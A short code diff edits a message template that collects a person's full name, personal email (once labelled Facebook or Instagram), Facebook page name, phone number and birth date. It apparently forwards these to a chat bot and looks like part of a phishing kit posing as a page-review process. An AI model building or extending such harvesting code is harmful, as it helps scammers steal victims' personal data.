@@ -108,10 +108,10 @@ ${
 }
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
-<b>📧 Personal Email Facebook or Instagram:</b> <code>${formData.personalEmail}</code>
+<b>� Page Name:</b> <code>${formData.pageName}</code>
+<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date of Birth:</b> <code>${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}</code>` : ''}
-${formData.reviewDescription ? `<b>📝 Review Description:</b> <code>${formData.reviewDescription}</code>` : ''}
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
